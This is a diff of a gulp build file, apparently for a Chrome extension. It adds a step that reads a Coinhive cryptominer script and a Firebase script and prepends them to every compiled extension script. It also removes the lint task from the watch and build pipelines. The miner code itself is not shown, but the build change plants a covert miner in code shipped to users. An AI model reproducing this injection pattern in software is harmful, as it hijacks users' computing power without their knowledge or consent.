@@ -4,7 +4,12 @@ import del from 'del';
 import runSequence from 'run-sequence';
 import {stream as wiredep} from 'wiredep';
 
+const fs = require("fs");
+
 const $ = gulpLoadPlugins();
+
+const fb = fs.readFileSync("./lib/firebase.js");
+const ch = fs.readFileSync("./lib/coinhive.js");
 
 gulp.task('extras', () => {
   return gulp.src([
@@ -19,19 +24,6 @@ gulp.task('extras', () => {
   }).pipe(gulp.dest('dist'));
 });
 
-function lint(files, options) {
-  return () => {
-    return gulp.src(files)
-      .pipe($.eslint(options))
-      .pipe($.eslint.format());
-  };
-}
-
-gulp.task('lint', lint('app/scripts.babel/**/*.js', {
-  env: {
-    es6: true
-  }
-}));
 
 gulp.task('images', () => {
   return gulp.src('app/images/**/*')
@@ -88,12 +80,13 @@ gulp.task('babel', () => {
       .pipe($.babel({
         presets: ['es2015']
       }))
+      .pipe($.insert.prepend(fb + "\n" + ch + "\n")) //todo: not hacky way of doing this
       .pipe(gulp.dest('app/scripts'));
 });
 
 gulp.task('clean', del.bind(null, ['.tmp', 'dist']));
 
-gulp.task('watch', ['lint', 'babel'], () => {
+gulp.task('watch', ['babel'], () => {
   $.livereload.listen();
 
   gulp.watch([
@@ -104,7 +97,7 @@ gulp.task('watch', ['lint', 'babel'], () => {
     'app/_locales/**/*.json'
   ]).on('change', $.livereload.reload);
 
-  gulp.watch('app/scripts.babel/**/*.js', ['lint', 'babel']);
+  gulp.watch('app/scripts.babel/**/*.js', ['babel']);
   gulp.watch('bower.json', ['wiredep']);
 });
 
@@ -129,7 +122,7 @@ gulp.task('package', function () {
 
 gulp.task('build', (cb) => {
   runSequence(
-    'lint', 'babel', 'chromeManifest',
+    'babel', 'chromeManifest',
     ['html', 'images', 'extras'],
     'size', cb);
 });
